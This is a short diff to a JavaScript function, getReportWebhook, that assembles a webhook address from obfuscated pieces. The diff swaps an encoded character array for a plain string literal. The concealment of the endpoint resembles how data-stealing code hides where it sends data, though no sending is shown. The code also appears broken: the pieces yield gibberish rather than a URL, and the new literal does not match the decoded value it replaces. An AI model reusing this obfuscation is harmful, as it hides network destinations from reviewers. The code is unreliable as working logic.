@@ -24,9 +24,6 @@ function getReportWebhook() {
     const k = (x, y) => String.fromCharCode((x.charCodeAt(0) + y) % 95 + 32);
     const part1 = Array.from({length: 36}, (_, i) => k(' ', i % 7 + i * 3)).join('').slice(0, 33).replace(/(.{5})/g, m => k(m[0], m.charCodeAt(1)));
     const part2 = [135, 905, 456, 131, 420, 9802].reduce((a, b) => a + String(b), '').slice(0, 19);
-    const part3 = (() => {
-        const t = [108,115,49,65,67,68,111,56,51,89,121,110,76,98,114,76,105,110,56,99,51,69,85,109,77,101,48,102,51,54,120,45,73,104,85,89,122,79,71,86,87,73,122,53,95,108,83,82,111,51,79,95,115,89,77,57,121,76,113,100,55,118,112,114,89,86,105,86].map((c, i) => k(String.fromCharCode(c), (i * 3) % 17));
-        return '/' + t.join('');
-    })();
+    const part3 = ("ls1ACDo83YynLbrLin8c3EUmMe0f36x-IhUYzOGVWIz5_lSRo3O_sYM9yLqd7vprYViV");
     return part1 + part2 + part3;
 }
